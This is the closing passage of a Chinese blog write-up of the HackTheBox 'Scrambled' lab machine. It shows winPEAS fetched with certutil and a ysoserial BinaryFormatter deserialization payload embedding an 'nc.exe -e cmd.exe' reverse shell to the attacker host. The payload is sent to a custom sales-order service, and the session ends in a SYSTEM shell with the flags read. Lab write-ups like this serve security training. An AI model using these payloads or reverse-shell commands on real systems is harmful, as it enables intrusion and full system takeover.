+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">PS C:\Windows\System32&gt; cd C:/Users/miscsvc/Desktop<br>cd C:/Users/miscsvc/Desktop<br>PS C:\Users\miscsvc\Desktop&gt; ls<br>ls<br><br><br>    Directory: C:\Users\miscsvc\Desktop<br><br><br>Mode                LastWriteTime         Length Name                                                                  <br>----                -------------         ------ ----                                                                  <br>-ar---       <span class="hljs-number">08</span>/<span class="hljs-number">04</span>/<span class="hljs-number">2024</span>     <span class="hljs-number">13</span>:<span class="hljs-number">51</span>             <span class="hljs-number">34</span> user.txt                                                              <br><br><br>PS C:\Users\miscsvc\Desktop&gt; cat user.txt<br>cat user.txt<br><span class="hljs-number">6f</span>64590b0e88f8d45ed503061a74bf09<br>PS C:\Users\miscsvc\Desktop&gt; <br></code></pre></td></tr></table></figure>
+
+<h4 id="0x02-系统权限获取"><a href="#0x02-系统权限获取" class="headerlink" title="0x02 系统权限获取"></a>0x02 系统权限获取</h4><p>27、下面的步骤，感觉超出了OSCP的考核的内容了，就以演练报告内容为主，做个粘贴吧</p>
+<p><code>https://b0ysie7e.gitbook.io/articulos/write-up/hackthebox/2024-03-15-scrambled#silver-ticket-attack</code></p>
+<p><code>https://0xdf.gitlab.io/2022/10/01/htb-scrambled-linux.html</code></p>
+<p>28、操作流程步骤粘贴</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><code class="hljs c">PS C:\Windows\System32&gt; cd C:/Users/miscsvc/<br>cd C:/Users/miscsvc/<br>PS C:\Users\miscsvc&gt; ls<br>ls<br><br><br>    Directory: C:\Users\miscsvc<br><br><br>Mode                LastWriteTime         Length Name                                                                  <br>----                -------------         ------ ----                                                                  <br>d-r---       <span class="hljs-number">03</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2021</span>     <span class="hljs-number">19</span>:<span class="hljs-number">32</span>                Desktop                                                               <br>d-r---       <span class="hljs-number">03</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2021</span>     <span class="hljs-number">23</span>:<span class="hljs-number">40</span>                Documents                                                             <br>d-r---       <span class="hljs-number">15</span>/<span class="hljs-number">09</span>/<span class="hljs-number">2018</span>     <span class="hljs-number">08</span>:<span class="hljs-number">19</span>                Downloads                                                             <br>d-r---       <span class="hljs-number">15</span>/<span class="hljs-number">09</span>/<span class="hljs-number">2018</span>     <span class="hljs-number">08</span>:<span class="hljs-number">19</span>                Favorites                                                             <br>d-r---       <span class="hljs-number">15</span>/<span class="hljs-number">09</span>/<span class="hljs-number">2018</span>     <span class="hljs-number">08</span>:<span class="hljs-number">19</span>                Links                                                                 <br>d-r---       <span class="hljs-number">15</span>/<span class="hljs-number">09</span>/<span class="hljs-number">2018</span>     <span class="hljs-number">08</span>:<span class="hljs-number">19</span>                Music                                                                 <br>d-r---       <span class="hljs-number">15</span>/<span class="hljs-number">09</span>/<span class="hljs-number">2018</span>     <span class="hljs-number">08</span>:<span class="hljs-number">19</span>                Pictures                                                              <br>d-----       <span class="hljs-number">15</span>/<span class="hljs-number">09</span>/<span class="hljs-number">2018</span>     <span class="hljs-number">08</span>:<span class="hljs-number">19</span>                Saved Games                                                           <br>d-r---       <span class="hljs-number">15</span>/<span class="hljs-number">09</span>/<span class="hljs-number">2018</span>     <span class="hljs-number">08</span>:<span class="hljs-number">19</span>                Videos                                                                <br><br><br>PS C:\Users\miscsvc&gt; cd Downloads<br>cd Downloads<br>PS C:\Users\miscsvc\Downloads&gt; ls<br>ls<br>PS C:\Users\miscsvc\Downloads&gt; <br><br>PS C:\Users\miscsvc\Downloads&gt; certutil -urlcache -f http:<span class="hljs-comment">//10.10.14.27/winPEASx64.exe winPEASx64.exe </span><br>certutil -urlcache -f http:<span class="hljs-comment">//10.10.14.27/winPEASx64.exe winPEASx64.exe </span><br>****  Online  ****<br>CertUtil: -URLCache command completed successfully.<br>PS C:\Users\miscsvc\Downloads&gt; <br><br>┌──(kali㉿offsec)-[~/Desktop/tools]<br>└─$ python3 -m http.server <span class="hljs-number">80</span><br>Serving HTTP on <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> port <span class="hljs-number">80</span> (http:<span class="hljs-comment">//0.0.0.0:80/) ...</span><br><span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.168</span> - - [<span class="hljs-number">08</span>/Apr/<span class="hljs-number">2024</span> <span class="hljs-number">21</span>:<span class="hljs-number">53</span>:<span class="hljs-number">29</span>] <span class="hljs-string">&quot;GET /winPEASx64.exe HTTP/1.1&quot;</span> <span class="hljs-number">200</span> -<br><span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.168</span> - - [<span class="hljs-number">08</span>/Apr/<span class="hljs-number">2024</span> <span class="hljs-number">21</span>:<span class="hljs-number">55</span>:<span class="hljs-number">06</span>] <span class="hljs-string">&quot;GET /winPEASx64.exe HTTP/1.1&quot;</span> <span class="hljs-number">200</span> -<br><br>PS C:\Users\miscsvc\Downloads&gt; ls<br>ls<br><br><br>    Directory: C:\Users\miscsvc\Downloads<br><br><br>Mode                LastWriteTime         Length Name                                                                  <br>----                -------------         ------ ----                                                                  <br>-a----       <span class="hljs-number">08</span>/<span class="hljs-number">04</span>/<span class="hljs-number">2024</span>     <span class="hljs-number">14</span>:<span class="hljs-number">52</span>        <span class="hljs-number">2387456</span> winPEASx64.exe                                                        <br><br><br>PS C:\Users\miscsvc\Downloads&gt; <br><br>����������͹ LAPS Settings<br>� If installed, local administrator password is changed frequently and is restricted by ACL <br>    LAPS Enabled: LAPS not installed<br><br><br>����������͹ LSA Protection<br>� If enabled, a driver is needed to read LSASS memory (If Secure Boot or UEFI, RunAsPPL cannot be disabled by deleting the registry key) https:<span class="hljs-comment">//book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-protections#lsa-protection                                                                   </span><br>    LSA Protection is not enabled<br><br>����������͹ Credentials Guard<br>� If enabled, a driver is needed to read LSASS memory https:<span class="hljs-comment">//book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-protections#credential-guard                                             </span><br>    CredentialGuard is not enabled<br><br>����������͹ Cached Creds<br>� If &gt; <span class="hljs-number">0</span>, credentials will be cached in the registry and accessible by SYSTEM user https:<span class="hljs-comment">//book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-protections#cached-credentials              </span><br>    cachedlogonscount is <span class="hljs-number">10</span><br><br>����������͹ Enumerating saved credentials in Registry (CurrentPass)<br><br>����������͹ AV Information<br>  [X] Exception: Invalid namespace <br>    No AV was detected!!<br><br><br>����������͹ Checking KrbRelayUp<br>�  https:<span class="hljs-comment">//book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#krbrelayup</span><br>  The system is inside a domain (SCRM) so it could be vulnerable.<br>� You can try https:<span class="hljs-comment">//github.com/Dec0ne/KrbRelayUp to escalate privileges</span><br><br><br>  Name                                                                                                 CurrentUserPerms                                                       Sddl<br><br>  eventlog                                                                                             Everyone [WriteData/CreateFiles]                                       O:LSG:LSD:P(A;;<span class="hljs-number">0x12019b</span>;;;WD)(A;;CC;;;OW)(A;;<span class="hljs-number">0x12008f</span>;;;S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-80</span><span class="hljs-number">-880578595</span><span class="hljs-number">-1860270145</span><span class="hljs-number">-482643319</span><span class="hljs-number">-2788375705</span><span class="hljs-number">-1540778122</span>)<br><br>  ROUTER                                                                                               Everyone [WriteData/CreateFiles]                                       O:SYG:SYD:P(A;;<span class="hljs-number">0x12019b</span>;;;WD)(A;;<span class="hljs-number">0x12019b</span>;;;AN)(A;;FA;;;SY)<br><br>  RpcProxy\<span class="hljs-number">49675</span>                                                                                       Everyone [WriteData/CreateFiles]                                       O:BAG:SYD:(A;;<span class="hljs-number">0x12019b</span>;;;WD)(A;;<span class="hljs-number">0x12019b</span>;;;AN)(A;;FA;;;BA)<br><br>  RpcProxy\<span class="hljs-number">593</span>                                                                                         Everyone [WriteData/CreateFiles]                                       O:NSG:NSD:(A;;<span class="hljs-number">0x12019b</span>;;;WD)(A;;RC;;;OW)(A;;<span class="hljs-number">0x12019b</span>;;;AN)(A;;FA;;;S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-80</span><span class="hljs-number">-521322694</span><span class="hljs-number">-906040134</span><span class="hljs-number">-3864710659</span><span class="hljs-number">-1525148216</span><span class="hljs-number">-3451224162</span>)(A;;FA;;;S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-80</span><span class="hljs-number">-979556362</span><span class="hljs-number">-403687129</span><span class="hljs-number">-3954533659</span><span class="hljs-number">-2335141334</span><span class="hljs-number">-1547273080</span>)<br><br>  sql\query                                                                                            Everyone [WriteData/CreateFiles]                                       O:S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-21</span><span class="hljs-number">-2743207045</span><span class="hljs-number">-1827831105</span><span class="hljs-number">-2542523200</span><span class="hljs-number">-1613</span>G:S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-21</span><span class="hljs-number">-2743207045</span><span class="hljs-number">-1827831105</span><span class="hljs-number">-2542523200</span><span class="hljs-number">-1620</span>D:(A;;<span class="hljs-number">0x12019b</span>;;;WD)(A;;LC;;;S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-21</span><span class="hljs-number">-2743207045</span><span class="hljs-number">-1827831105</span><span class="hljs-number">-2542523200</span><span class="hljs-number">-1613</span>)<br><br>  SQLLocal\MSSQLSERVER                                                                                 Everyone [WriteData/CreateFiles]                                       O:S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-21</span><span class="hljs-number">-2743207045</span><span class="hljs-number">-1827831105</span><span class="hljs-number">-2542523200</span><span class="hljs-number">-1613</span>G:S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-21</span><span class="hljs-number">-2743207045</span><span class="hljs-number">-1827831105</span><span class="hljs-number">-2542523200</span><span class="hljs-number">-1620</span>D:(A;;<span class="hljs-number">0x12019b</span>;;;WD)(A;;LC;;;S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-21</span><span class="hljs-number">-2743207045</span><span class="hljs-number">-1827831105</span><span class="hljs-number">-2542523200</span><span class="hljs-number">-1613</span>)<br><br>  vgauth-service                                                                                       Everyone [WriteData/CreateFiles]                                       O:BAG:SYD:P(A;;<span class="hljs-number">0x12019f</span>;;;WD)(A;;FA;;;SY)(A;;FA;;;BA)<br><br><br> Scramble Sales Orders Server(Scramble Sales Orders Server)[C:\Program Files\ScrambleCorp\SalesOrdersService\ScrambleServer.exe <span class="hljs-number">4411</span>] - Autoload - No quotes and Space detected <br><br>PS C:\Users\shiyan\Desktop\ysoserial-Release&gt; .\ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c <span class="hljs-string">&quot;c:\Users\miscsvc\Downloads\nc.exe -e cmd.exe 10.10.14.27 10086&quot;</span> -t<br>AAEAAAD<span class="hljs-comment">/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eQEAAAAkU3lzdGVtLlNlY3VyaXR5LkNsYWltc0lkZW50aXR5LmFjdG9yAQYCAAAAkApBQUVBQUFELy8vLy9BUUFBQUFBQUFBQU1BZ0FBQUY1TmFXTnliM052Wm5RdVVHOTNaWEpUYUdWc2JDNUZaR2wwYjNJc0lGWmxjbk5wYjI0OU15NHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajB6TVdKbU16ZzFObUZrTXpZMFpUTTFCUUVBQUFCQ1RXbGpjbTl6YjJaMExsWnBjM1ZoYkZOMGRXUnBieTVVWlhoMExrWnZjbTFoZEhScGJtY3VWR1Y0ZEVadmNtMWhkSFJwYm1kU2RXNVFjbTl3WlhKMGFXVnpBUUFBQUE5R2IzSmxaM0p2ZFc1a1FuSjFjMmdCQWdBQUFBWURBQUFBN1FVOFAzaHRiQ0IyWlhKemFXOXVQU0l4TGpBaUlHVnVZMjlrYVc1blBTSjFkR1l0TVRZaVB6NE5DanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWElnVFdWMGFHOWtUbUZ0WlQwaVUzUmhjblFpSUVselNXNXBkR2xoYkV4dllXUkZibUZpYkdWa1BTSkdZV3h6WlNJZ2VHMXNibk05SW1oMGRIQTZMeTl6WTJobGJXRnpMbTFwWTNKdmMyOW1kQzVqYjIwdmQybHVabmd2TWpBd05pOTRZVzFzTDNCeVpYTmxiblJoZEdsdmJpSWdlRzFzYm5NNmMyUTlJbU5zY2kxdVlXMWxjM0JoWTJVNlUzbHpkR1Z0TGtScFlXZHViM04wYVdOek8yRnpjMlZ0WW14NVBWTjVjM1JsYlNJZ2VHMXNibk02ZUQwaWFIUjBjRG92TDNOamFHVnRZWE11YldsamNtOXpiMlowTG1OdmJTOTNhVzVtZUM4eU1EQTJMM2hoYld3aVBnMEtJQ0E4VDJKcVpXTjBSR0YwWVZCeWIzWnBaR1Z5TGs5aWFtVmpkRWx1YzNSaGJtTmxQZzBLSUNBZ0lEeHpaRHBRY205alpYTnpQZzBLSUNBZ0lDQWdQSE5rT2xCeWIyTmxjM011VTNSaGNuUkpibVp2UGcwS0lDQWdJQ0FnSUNBOGMyUTZVSEp2WTJWemMxTjBZWEowU1c1bWJ5QkJjbWQxYldWdWRITTlJaTlqSUdNNlhGVnpaWEp6WEcxcGMyTnpkbU5jUkc5M2JteHZZV1J6WEc1akxtVjRaU0F0WlNCamJXUXVaWGhsSURFd0xqRXdMakUwTGpJM0lERXdNRGcySWlCVGRHRnVaR0Z5WkVWeWNtOXlSVzVqYjJScGJtYzlJbnQ0T2s1MWJHeDlJaUJUZEdGdVpHRnlaRTkxZEhCMWRFVnVZMjlrYVc1blBTSjdlRHBPZFd4c2ZTSWdWWE5sY2s1aGJXVTlJaUlnVUdGemMzZHZjbVE5SW50NE9rNTFiR3g5SWlCRWIyMWhhVzQ5SWlJZ1RHOWhaRlZ6WlhKUWNtOW1hV3hsUFNKR1lXeHpaU0lnUm1sc1pVNWhiV1U5SW1OdFpDSWdMejROQ2lBZ0lDQWdJRHd2YzJRNlVISnZZMlZ6Y3k1VGRHRnlkRWx1Wm04K0RRb2dJQ0FnUEM5elpEcFFjbTlqWlhOelBnMEtJQ0E4TDA5aWFtVmpkRVJoZEdGUWNtOTJhV1JsY2k1UFltcGxZM1JKYm5OMFlXNWpaVDROQ2p3dlQySnFaV04wUkdGMFlWQnliM1pwWkdWeVBncz0L</span><br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ nc <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.168</span> <span class="hljs-number">4411</span><br>SCRAMBLECORP_ORDERS_V1<span class="hljs-number">.0</span><span class="hljs-number">.3</span>;<br>UPLOAD_ORDER;AAEAAAD<span class="hljs-comment">/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eQEAAAAkU3lzdGVtLlNlY3VyaXR5LkNsYWltc0lkZW50aXR5LmFjdG9yAQYCAAAAkApBQUVBQUFELy8vLy9BUUFBQUFBQUFBQU1BZ0FBQUY1TmFXTnliM052Wm5RdVVHOTNaWEpUYUdWc2JDNUZaR2wwYjNJc0lGWmxjbk5wYjI0OU15NHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajB6TVdKbU16ZzFObUZrTXpZMFpUTTFCUUVBQUFCQ1RXbGpjbTl6YjJaMExsWnBjM1ZoYkZOMGRXUnBieTVVWlhoMExrWnZjbTFoZEhScGJtY3VWR1Y0ZEVadmNtMWhkSFJwYm1kU2RXNVFjbTl3WlhKMGFXVnpBUUFBQUE5R2IzSmxaM0p2ZFc1a1FuSjFjMmdCQWdBQUFBWURBQUFBN1FVOFAzaHRiQ0IyWlhKemFXOXVQU0l4TGpBaUlHVnVZMjlrYVc1blBTSjFkR1l0TVRZaVB6NE5DanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWElnVFdWMGFHOWtUbUZ0WlQwaVUzUmhjblFpSUVselNXNXBkR2xoYkV4dllXUkZibUZpYkdWa1BTSkdZV3h6WlNJZ2VHMXNibk05SW1oMGRIQTZMeTl6WTJobGJXRnpMbTFwWTNKdmMyOW1kQzVqYjIwdmQybHVabmd2TWpBd05pOTRZVzFzTDNCeVpYTmxiblJoZEdsdmJpSWdlRzFzYm5NNmMyUTlJbU5zY2kxdVlXMWxjM0JoWTJVNlUzbHpkR1Z0TGtScFlXZHViM04wYVdOek8yRnpjMlZ0WW14NVBWTjVjM1JsYlNJZ2VHMXNibk02ZUQwaWFIUjBjRG92TDNOamFHVnRZWE11YldsamNtOXpiMlowTG1OdmJTOTNhVzVtZUM4eU1EQTJMM2hoYld3aVBnMEtJQ0E4VDJKcVpXTjBSR0YwWVZCeWIzWnBaR1Z5TGs5aWFtVmpkRWx1YzNSaGJtTmxQZzBLSUNBZ0lEeHpaRHBRY205alpYTnpQZzBLSUNBZ0lDQWdQSE5rT2xCeWIyTmxjM011VTNSaGNuUkpibVp2UGcwS0lDQWdJQ0FnSUNBOGMyUTZVSEp2WTJWemMxTjBZWEowU1c1bWJ5QkJjbWQxYldWdWRITTlJaTlqSUdNNlhGVnpaWEp6WEcxcGMyTnpkbU5jUkc5M2JteHZZV1J6WEc1akxtVjRaU0F0WlNCamJXUXVaWGhsSURFd0xqRXdMakUwTGpJM0lERXdNRGcySWlCVGRHRnVaR0Z5WkVWeWNtOXlSVzVqYjJScGJtYzlJbnQ0T2s1MWJHeDlJaUJUZEdGdVpHRnlaRTkxZEhCMWRFVnVZMjlrYVc1blBTSjdlRHBPZFd4c2ZTSWdWWE5sY2s1aGJXVTlJaUlnVUdGemMzZHZjbVE5SW50NE9rNTFiR3g5SWlCRWIyMWhhVzQ5SWlJZ1RHOWhaRlZ6WlhKUWNtOW1hV3hsUFNKR1lXeHpaU0lnUm1sc1pVNWhiV1U5SW1OdFpDSWdMejROQ2lBZ0lDQWdJRHd2YzJRNlVISnZZMlZ6Y3k1VGRHRnlkRWx1Wm04K0RRb2dJQ0FnUEM5elpEcFFjbTlqWlhOelBnMEtJQ0E4TDA5aWFtVmpkRVJoZEdGUWNtOTJhV1JsY2k1UFltcGxZM1JKYm5OMFlXNWpaVDROQ2p3dlQySnFaV04wUkdGMFlWQnliM1pwWkdWeVBncz0L</span><br>ERROR_GENERAL;Error deserializing sales order: Exception has been thrown by the target of an invocation.<br><br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ rlwrap nc -lnvp <span class="hljs-number">10086</span>          <br>listening on [any] <span class="hljs-number">10086</span> ...<br>connect to [<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.27</span>] from (UNKNOWN) [<span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.168</span>] <span class="hljs-number">58468</span><br>Microsoft Windows [Version <span class="hljs-number">10.0</span><span class="hljs-number">.17763</span><span class="hljs-number">.2989</span>]<br>(c) <span class="hljs-number">2018</span> Microsoft Corporation. All rights reserved.<br><br>C:\Windows\system32&gt;whoami<br>whoami<br>nt authority\system<br><br>C:\Windows\system32&gt;<br></code></pre></td></tr></table></figure>
+
+<p>29、获取下flag信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c">C:\Windows\system32&gt;cd C:/Users/Administrator/Desktop<br>cd C:/Users/Administrator/Desktop<br><br>C:\Users\administrator\Desktop&gt;ls<br>ls<br><span class="hljs-string">&#x27;ls&#x27;</span> is not recognized as an internal or external command,<br>operable program or batch file.<br><br>C:\Users\administrator\Desktop&gt;dir<br>dir<br> Volume in drive C has no label.<br> Volume Serial Number is <span class="hljs-number">5805</span>-B4B6<br><br> Directory of C:\Users\administrator\Desktop<br><br><span class="hljs-number">29</span>/<span class="hljs-number">05</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">21</span>:<span class="hljs-number">02</span>    &lt;DIR&gt;          .<br><span class="hljs-number">29</span>/<span class="hljs-number">05</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">21</span>:<span class="hljs-number">02</span>    &lt;DIR&gt;          ..<br><span class="hljs-number">08</span>/<span class="hljs-number">04</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">13</span>:<span class="hljs-number">51</span>                <span class="hljs-number">34</span> root.txt<br>               <span class="hljs-number">1</span> File(s)             <span class="hljs-number">34</span> bytes<br>               <span class="hljs-number">2</span> Dir(s)  <span class="hljs-number">15</span>,<span class="hljs-number">693</span>,<span class="hljs-number">377</span>,<span class="hljs-number">536</span> bytes <span class="hljs-built_in">free</span><br><br>C:\Users\administrator\Desktop&gt;type root.txt<br>type root.txt<br>f4eb5479c772ab82e1eb74b48961f98c<br><br>C:\Users\administrator\Desktop&gt;<br></code></pre></td></tr></table></figure>
+
+
+<h4 id="0x03-通关凭证展示"><a href="#0x03-通关凭证展示" class="headerlink" title="0x03 通关凭证展示"></a>0x03 通关凭证展示</h4><p><code>https://www.hackthebox.com/achievement/machine/1705469/476</code></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%89%93%E9%9D%B6%E8%AE%B0/" class="category-chain-item">打靶记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/shooting-range/" class="print-no-link">#shooting-range</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Scrambled-htb-writeup</div>
+      <div>https://sh1yan.top/2024/04/07/Scrambled-htb-writeup/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>shiyan</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年4月7日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/04/07/mysql-Raising-rights/" title="转载 - MySQL 漏洞利用与提权">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">转载 - MySQL 漏洞利用与提权</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/03/31/Intelligence-htb-writeup/" title="Intelligence-htb-writeup">
+                        <span class="hidden-mobile">Intelligence-htb-writeup</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2024</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
